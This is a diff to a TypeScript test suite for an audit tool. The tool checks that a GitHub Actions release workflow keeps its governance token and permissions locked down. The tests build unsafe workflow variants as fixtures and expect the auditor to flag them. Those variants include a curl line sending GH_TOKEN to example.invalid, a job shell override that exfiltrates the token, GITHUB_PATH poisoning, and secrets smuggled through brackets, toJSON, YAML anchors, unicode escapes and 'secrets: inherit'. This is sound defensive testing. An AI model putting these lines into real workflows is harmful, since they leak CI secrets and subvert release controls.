@@ -13,6 +13,7 @@ const approvalWorkflowPath = decodeURIComponent(
 const releaseWorkflowPath = decodeURIComponent(
   new URL('../../.github/workflows/publish-reviewed-release.yml', import.meta.url).pathname,
 );
+const governanceShell = '        shell: /usr/bin/bash --noprofile --norc -euo pipefail {0}';
 
 function file(path: string, text = 'safe public text'): PublicAuditEntry {
   return { path, type: 'file', bytes: encoder.encode(text) };
@@ -23,6 +24,23 @@ function findings(entries: readonly PublicAuditEntry[], branchName = 'codex/boot
     branchName,
     requireGovernance: false,
   }).findings;
+}
+
+function mustReplaceAll(
+  text: string,
+  needle: string,
+  replacement: string,
+  expectedCount: number,
+) {
+  const count = text.split(needle).length - 1;
+  if (count !== expectedCount) {
+    throw new Error(`expected ${expectedCount} workflow mutation target(s), found ${count}`);
+  }
+  return text.split(needle).join(replacement);
+}
+
+function mustReplace(text: string, needle: string, replacement: string) {
+  return mustReplaceAll(text, needle, replacement, 1);
 }
 
 describe('public repository disclosure audit', () => {
@@ -216,20 +234,95 @@ describe('public repository disclosure audit', () => {
     expect(workflow).toContain('pull-requests: read');
     expect(workflow).toContain('secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN');
     expect(workflow).not.toContain('commits/$SEAL_SHA/check-runs');
+    expect(workflow.match(
+      /shell: \/usr\/bin\/bash --noprofile --norc -euo pipefail \{0\}/g,
+    ) ?? []).toHaveLength(2);
+  });
+
+  it('rejects a Release workflow without pull-request read permission', async () => {
+    const path = '.github/workflows/publish-reviewed-release.yml';
+    const workflow = await readFile(releaseWorkflowPath, 'utf8');
+    const missingPullRequestRead = mustReplace(workflow, '  pull-requests: read\n', '');
+
+    expect(findings([file(path, missingPullRequestRead)]))
+      .toContainEqual({ category: 'reviewed-workflow-permissions', path });
+  });
+
+  it('rejects a reviewed workflow job-level permission override', async () => {
+    const path = '.github/workflows/publish-reviewed-release.yml';
+    const workflow = await readFile(releaseWorkflowPath, 'utf8');
+    const jobOverride = mustReplace(
+      workflow,
+      '  release:\n    if:',
+      '  release:\n    permissions: write-all\n    if:',
+    );
+
+    expect(findings([file(path, jobOverride)]))
+      .toContainEqual({ category: 'reviewed-workflow-permissions', path });
+
+    const quotedJobOverride = mustReplace(
+      workflow,
+      '  release:\n    if:',
+      '  release:\n    "permissions": write-all\n    if:',
+    );
+    expect(findings([file(path, quotedJobOverride)]))
+      .toContainEqual({ category: 'reviewed-workflow-permissions', path });
+
+    const mergedJobOverride = mustReplace(
+      workflow,
+      'jobs:\n  release:',
+      [
+        'x-privileged: &privileged',
+        '  permissions: write-all',
+        '',
+        'jobs:',
+        '  release:',
+        '    <<: *privileged',
+      ].join('\n'),
+    );
+    expect(findings([file(path, mergedJobOverride)]))
+      .toContainEqual({ category: 'reviewed-workflow-permissions', path });
+  });
+
+  it('rejects restoring fail-open optional tag reads', async () => {
+    const path = '.github/workflows/publish-reviewed-release.yml';
+    const workflow = await readFile(releaseWorkflowPath, 'utf8');
+    const failOpenReads = mustReplaceAll(
+      workflow,
+      'bash trusted/scripts/github-api-read-optional.sh',
+      'gh api --method GET || printf "null\\n" #',
+      2,
+    );
+
+    expect(findings([file(path, failOpenReads)]))
+      .toContainEqual({ category: 'reviewed-workflow-contract', path });
   });
 
   it('rejects any unapproved governance secret name or placement', async () => {
     const path = '.github/workflows/publish-reviewed-release.yml';
     const workflow = await readFile(releaseWorkflowPath, 'utf8');
-    const wrongName = workflow
-      .split('secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN')
-      .join('secrets.OTHER_TOKEN');
-    const movedIntoBuild = workflow
-      .replace(
-        'GH_TOKEN: ${{ secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}',
-        'GH_TOKEN: disabled',
-      )
-      .replace(
+    const wrongName = mustReplaceAll(
+      workflow,
+      'secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN',
+      'secrets.OTHER_TOKEN',
+      2,
+    );
+    const movedIntoBuild = mustReplace(
+      mustReplace(
+        workflow,
+        [
+          'name: Read fail-closed repository governance facts',
+          governanceShell,
+          '        env:',
+          '          GH_TOKEN: ${{ secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}',
+        ].join('\n'),
+        [
+          'name: Read fail-closed repository governance facts',
+          governanceShell,
+          '        env:',
+          '          GH_TOKEN: disabled',
+        ].join('\n'),
+      ),
         'working-directory: release\n        env:\n          SEAL_SHA: ${{ steps.handoff.outputs.seal_sha }}',
         [
           'working-directory: release',
@@ -237,7 +330,7 @@ describe('public repository disclosure audit', () => {
           '          SEAL_SHA: ${{ steps.handoff.outputs.seal_sha }}',
           '          LEAKED_GOVERNANCE_TOKEN: ${{ secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}',
         ].join('\n'),
-      );
+    );
 
     expect(findings([file(path, wrongName)]))
       .toContainEqual({ category: 'reviewed-workflow-boundary', path });
@@ -245,10 +338,290 @@ describe('public repository disclosure audit', () => {
       .toContainEqual({ category: 'reviewed-workflow-boundary', path });
   });
 
+  it('binds the governance token to the exact parsed env paths', async () => {
+    const path = '.github/workflows/publish-reviewed-release.yml';
+    const workflow = await readFile(releaseWorkflowPath, 'utf8');
+    const escapedIntoBuild = mustReplace(
+      mustReplace(
+        workflow,
+        [
+          'name: Refresh governance facts before immutable publication',
+          "        if: steps.policy.outputs.status != 'already_immutable'",
+          governanceShell,
+          '        env:',
+          '          GH_TOKEN: ${{ secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}',
+        ].join('\n'),
+        [
+          'name: Refresh governance facts before immutable publication',
+          "        if: steps.policy.outputs.status != 'already_immutable'",
+          governanceShell,
+          '        env:',
+          '          GH_TOKEN: disabled # ${{ secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}',
+        ].join('\n'),
+      ),
+      'working-directory: release\n        env:\n          SEAL_SHA: ${{ steps.handoff.outputs.seal_sha }}',
+      [
+        'working-directory: release',
+        '        env:',
+        '          SEAL_SHA: ${{ steps.handoff.outputs.seal_sha }}',
+        '          LEAKED_GOVERNANCE_TOKEN: "${{ se\\u0063rets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}"',
+      ].join('\n'),
+    );
+    const wrongEnvKey = mustReplace(
+      workflow,
+      [
+        'name: Read fail-closed repository governance facts',
+        governanceShell,
+        '        env:',
+        '          GH_TOKEN: ${{ secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}',
+      ].join('\n'),
+      [
+        'name: Read fail-closed repository governance facts',
+        governanceShell,
+        '        env:',
+        '          READ_TOKEN: ${{ secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}',
+      ].join('\n'),
+    );
+
+    expect(findings([file(path, escapedIntoBuild)]))
+      .toContainEqual({ category: 'reviewed-workflow-boundary', path });
+    expect(findings([file(path, wrongEnvKey)]))
+      .toContainEqual({ category: 'reviewed-workflow-boundary', path });
+  });
+
+  it('requires both governance-token steps to keep the exact read-only command contract', async () => {
+    const path = '.github/workflows/publish-reviewed-release.yml';
+    const workflow = await readFile(releaseWorkflowPath, 'utf8');
+    const exfiltration = mustReplace(
+      workflow,
+      [
+        '          gh api --method GET "repos/$GH_REPO/rulesets/$tag_ruleset_id" \\',
+        '            > "$RUNNER_TEMP/saas-608-tag-ruleset.json"',
+      ].join('\n'),
+      [
+        '          gh api --method GET "repos/$GH_REPO/rulesets/$tag_ruleset_id" \\',
+        '            > "$RUNNER_TEMP/saas-608-tag-ruleset.json"',
+        '          curl --data "$GH_TOKEN" https://example.invalid/collect',
+      ].join('\n'),
+    );
+    const mutation = mustReplace(
+      workflow,
+      [
+        '          gh api --method GET "repos/$GH_REPO/immutable-releases" \\',
+        '            > "$RUNNER_TEMP/saas-608-immutability.json"',
+      ].join('\n'),
+      [
+        '          gh api --method DELETE "repos/$GH_REPO/immutable-releases" \\',
+        '            > "$RUNNER_TEMP/saas-608-immutability.json"',
+      ].join('\n'),
+    );
+
+    expect(findings([file(path, exfiltration)]))
+      .toContainEqual({ category: 'reviewed-workflow-boundary', path });
+    expect(findings([file(path, mutation)]))
+      .toContainEqual({ category: 'reviewed-workflow-boundary', path });
+  });
+
+  it('rejects inherited or containerized execution contexts for reviewed workflows', async () => {
+    const path = '.github/workflows/publish-reviewed-release.yml';
+    const workflow = await readFile(releaseWorkflowPath, 'utf8');
+    const jobDefaults = mustReplace(
+      workflow,
+      '  release:\n    if:',
+      [
+        '  release:',
+        '    defaults:',
+        '      run:',
+        "        shell: bash -c 'curl --data \"$GH_TOKEN\" https://example.invalid; source \"$1\"' -- {0}",
+        '    if:',
+      ].join('\n'),
+    );
+    const jobContainer = mustReplace(
+      workflow,
+      '    runs-on: ubuntu-latest\n    timeout-minutes: 25',
+      [
+        '    runs-on: ubuntu-latest',
+        '    container: ghcr.io/example/leaking-runner:latest',
+        '    timeout-minutes: 25',
+      ].join('\n'),
+    );
+    const workflowDefaults = mustReplace(
+      workflow,
+      'jobs:\n  release:',
+      [
+        'defaults:',
+        '  run:',
+        '    shell: custom-shell {0}',
+        '',
+        'jobs:',
+        '  release:',
+      ].join('\n'),
+    );
+    const unexpectedStep = mustReplace(
+      workflow,
+      '    steps:\n      - name: Resolve and authenticate the exact source approval run',
+      [
+        '    steps:',
+        '      - name: Poison later command lookup',
+        '        run: echo /tmp/attacker >> "$GITHUB_PATH"',
+        '      - name: Resolve and authenticate the exact source approval run',
+      ].join('\n'),
+    );
+
+    for (const unsafe of [jobDefaults, jobContainer, workflowDefaults, unexpectedStep]) {
+      expect(findings([file(path, unsafe)]))
+        .toContainEqual({ category: 'reviewed-workflow-boundary', path });
+    }
+  });
+
+  it('locates governance steps structurally instead of relying on field order', async () => {
+    const path = '.github/workflows/publish-reviewed-release.yml';
+    const workflow = await readFile(releaseWorkflowPath, 'utf8');
+    const reorderedMetadata = mustReplace(
+      workflow,
+      '      - name: Read fail-closed repository governance facts',
+      [
+        '      - id: governance-preflight',
+        '        name: Read fail-closed repository governance facts',
+      ].join('\n'),
+    );
+
+    expect(findings([file(path, reorderedMetadata)]))
+      .not.toContainEqual({ category: 'reviewed-workflow-boundary', path });
+  });
+
+  it('rejects the governance token from a Release mutation step', async () => {
+    const path = '.github/workflows/publish-reviewed-release.yml';
+    const workflow = await readFile(releaseWorkflowPath, 'utf8');
+    const movedIntoPublish = mustReplace(
+      mustReplace(
+        workflow,
+        [
+          'name: Read fail-closed repository governance facts',
+          governanceShell,
+          '        env:',
+          '          GH_TOKEN: ${{ secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}',
+        ].join('\n'),
+        [
+          'name: Read fail-closed repository governance facts',
+          governanceShell,
+          '        env:',
+          '          GH_TOKEN: disabled',
+        ].join('\n'),
+      ),
+        'name: Publish the complete Release\n        if:',
+        [
+          'name: Publish the complete Release',
+          '        env:',
+          '          LEAKED_GOVERNANCE_TOKEN: ${{ secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}',
+          '        if:',
+        ].join('\n'),
+    );
+
+    expect(findings([file(path, movedIntoPublish)]))
+      .toContainEqual({ category: 'reviewed-workflow-boundary', path });
+  });
+
+  it('rejects bracket-syntax access to any additional secret', async () => {
+    const path = '.github/workflows/publish-reviewed-release.yml';
+    const workflow = await readFile(releaseWorkflowPath, 'utf8');
+    const bracketSecret = mustReplace(
+      workflow,
+      [
+        'name: Publish the complete Release',
+        "        if: steps.policy.outputs.status != 'already_immutable'",
+        '        env:',
+        '          GITHUB_TOKEN: ${{ github.token }}',
+      ].join('\n'),
+      [
+        'name: Publish the complete Release',
+        "        if: steps.policy.outputs.status != 'already_immutable'",
+        '        env:',
+        '          GITHUB_TOKEN: ${{ github.token }}',
+        "          LEAKED_TOKEN: ${{ secrets['OTHER_TOKEN'] }}",
+      ].join('\n'),
+    );
+
+    expect(findings([file(path, bracketSecret)]))
+      .toContainEqual({ category: 'reviewed-workflow-boundary', path });
+
+    const indirectSecret = mustReplace(
+      workflow,
+      [
+        'name: Publish the complete Release',
+        "        if: steps.policy.outputs.status != 'already_immutable'",
+        '        env:',
+        '          GITHUB_TOKEN: ${{ github.token }}',
+      ].join('\n'),
+      [
+        'name: Publish the complete Release',
+        "        if: steps.policy.outputs.status != 'already_immutable'",
+        '        env:',
+        '          GITHUB_TOKEN: ${{ github.token }}',
+        '          LEAKED_TOKEN: ${{ toJSON(secrets) }}',
+      ].join('\n'),
+    );
+    expect(findings([file(path, indirectSecret)]))
+      .toContainEqual({ category: 'reviewed-workflow-boundary', path });
+
+    const anchoredSecret = mustReplace(
+      mustReplace(
+        workflow,
+        [
+          'name: Read fail-closed repository governance facts',
+          governanceShell,
+          '        env:',
+          '          GH_TOKEN: ${{ secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}',
+        ].join('\n'),
+        [
+          'name: Read fail-closed repository governance facts',
+          governanceShell,
+          '        env:',
+          '          GH_TOKEN: &governance-token ${{ secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}',
+        ].join('\n'),
+      ),
+      [
+        'name: Publish the complete Release',
+        "        if: steps.policy.outputs.status != 'already_immutable'",
+        '        env:',
+        '          GITHUB_TOKEN: ${{ github.token }}',
+      ].join('\n'),
+      [
+        'name: Publish the complete Release',
+        "        if: steps.policy.outputs.status != 'already_immutable'",
+        '        env:',
+        '          GITHUB_TOKEN: ${{ github.token }}',
+        '          LEAKED_TOKEN: *governance-token',
+      ].join('\n'),
+    );
+    expect(findings([file(path, anchoredSecret)]))
+      .toContainEqual({ category: 'reviewed-workflow-boundary', path });
+  });
+
+  it('rejects reusable-workflow secret inheritance from a reviewed workflow', async () => {
+    const path = '.github/workflows/publish-reviewed-release.yml';
+    const workflow = await readFile(releaseWorkflowPath, 'utf8');
+    const inheritedSecrets = mustReplace(
+      workflow,
+      'jobs:\n  release:',
+      [
+        'jobs:',
+        '  inherited-secret-leak:',
+        `    uses: ZiZ-LG/example/.github/workflows/leak.yml@${'a'.repeat(40)}`,
+        '    secrets: inherit',
+        '  release:',
+      ].join('\n'),
+    );
+
+    expect(findings([file(path, inheritedSecrets)]))
+      .toContainEqual({ category: 'reviewed-workflow-boundary', path });
+  });
+
   it('rejects the governance token from the approval workflow', async () => {
     const path = '.github/workflows/approve-reviewed-content.yml';
     const workflow = await readFile(approvalWorkflowPath, 'utf8');
-    const unsafe = workflow.replace(
+    const unsafe = mustReplace(
+      workflow,
       'permissions:',
       'env:\n  GH_TOKEN: ${{ secrets.STEPHEN_RELEASE_GOVERNANCE_TOKEN }}\n\npermissions:',
     );
@@ -260,27 +633,34 @@ describe('public repository disclosure audit', () => {
   it('rejects recovery without owner/default-branch guards or with a restored check dependency', async () => {
     const path = '.github/workflows/publish-reviewed-release.yml';
     const workflow = await readFile(releaseWorkflowPath, 'utf8');
-    const missingGuard = workflow.replace(
+    const missingGuard = mustReplace(
+      workflow,
       '[[ "$CURRENT_REF" == "$DEFAULT_BRANCH" ]]',
       'true',
     );
-    const restoredCheck = workflow
-      .replace('  actions: read', '  actions: read\n  checks: read')
-      .replace(
-        'gh api --method GET "repos/$GH_REPO/pulls/$PR_NUMBER"',
-        [
-          'gh api --method GET "repos/$GH_REPO/commits/$SEAL_SHA/check-runs"',
-          '          gh api --method GET "repos/$GH_REPO/pulls/$PR_NUMBER"',
-        ].join('\n'),
-      );
+    const restoredCheckPermission = mustReplace(
+      workflow,
+      '  actions: read',
+      '  actions: read\n  checks: read',
+    );
+    const restoredCheckApi = mustReplace(
+      workflow,
+      'gh api --method GET "repos/$GH_REPO/pulls/$PR_NUMBER"',
+      [
+        'gh api --method GET "repos/$GH_REPO/commits/$SEAL_SHA/check-runs"',
+        '          gh api --method GET "repos/$GH_REPO/pulls/$PR_NUMBER"',
+      ].join('\n'),
+    );
 
     expect(findings([file(path, missingGuard)]))
       .toContainEqual({ category: 'reviewed-workflow-contract', path });
-    expect(findings([file(path, restoredCheck)]))
+    expect(findings([file(path, restoredCheckPermission)]))
       .toEqual(expect.arrayContaining([
         { category: 'reviewed-workflow-permissions', path },
         { category: 'reviewed-workflow-contract', path },
       ]));
+    expect(findings([file(path, restoredCheckApi)]))
+      .toContainEqual({ category: 'reviewed-workflow-contract', path });
   });
 
   it('rejects a Release workflow that has extra permissions or omits immutable final-state proof', () => {
